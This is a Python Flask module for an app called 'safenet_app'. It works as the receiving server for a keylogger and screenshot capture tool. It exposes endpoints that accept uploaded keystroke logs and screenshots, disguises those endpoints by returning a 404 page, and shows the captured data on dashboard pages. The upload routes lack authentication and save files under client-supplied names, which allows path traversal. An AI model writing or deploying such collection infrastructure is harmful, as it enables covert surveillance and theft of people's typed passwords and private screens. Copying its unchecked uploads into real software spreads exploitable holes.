from flask import render_template, request, Blueprint, current_app, session, url_for, redirect
from safenet_app import app, auth
from PIL import Image
import requests, os

administration = Blueprint('administration', __name__)


@administration.route("/dashboard", methods=['GET'])
def dashboard():

    f = open(app.root_path + "/static/log/log.txt", "r")
    log = f.read().split('\n')

    # print(log)

    images =  os.listdir(app.root_path + '/static/images/screenshot/')

    return render_template("dashboard.html", log=log, images=images)


@administration.route("/dashboard/screenshot", methods=['POST', 'GET'])
def screenshot():

    images =  os.listdir(app.root_path + '/static/images/screenshot/')

    return render_template("screenshots.html", images=images)

@administration.route("/dashboard/keystrokes", methods=['POST', 'GET'])
def keystrokes():

    f = open(app.root_path + "/static/log/log.txt", "r")
    log = f.read().split('\n')

    return render_template("keystrokes.html", log=log)


# https://stackoverflow.com/questions/10434599/get-the-data-received-in-a-flask-request
@administration.route("/api/v1/log", methods=['POST', 'GET'])
def api_log():
    if request.files:
        log = request.files['upload_file'].read().decode("utf-8")
        f = open(app.root_path + "/static/log/log.txt", "w")
        f.write(log)

    return render_template('errors/404.html')


@administration.route("/api/v1/image", methods=['POST', 'GET'])
def api_screenshot():
    if request.files:
        # print(request.files['upload_file'].read())
        # f = open(request.files['upload_file'], 'wb')
        screenshot = Image.open(request.files['upload_file'])
        screenshot.save(app.root_path + "/static/images/screenshot/" + request.files['upload_file'].filename)

    return render_template('errors/404.html')



# @administration.route("/api/v1/gettext", methods=['POST', 'GET'])
# def api_text():
#     files = {'upload_file': open('log.txt','rb')}
    
#     r = requests.post("http://127.0.0.1:5000/api/v1/log", files=files)

#     return render_template("keystrokes.html")


# @administration.route("/api/v1/getimage", methods=['POST', 'GET'])
# def api_image():
#     files = {'upload_file': open('internet.jpg','rb')}
    
#     r = requests.post("http://127.0.0.1:5000/api/v1/image", files=files)

#     return render_template("keystrokes.html")


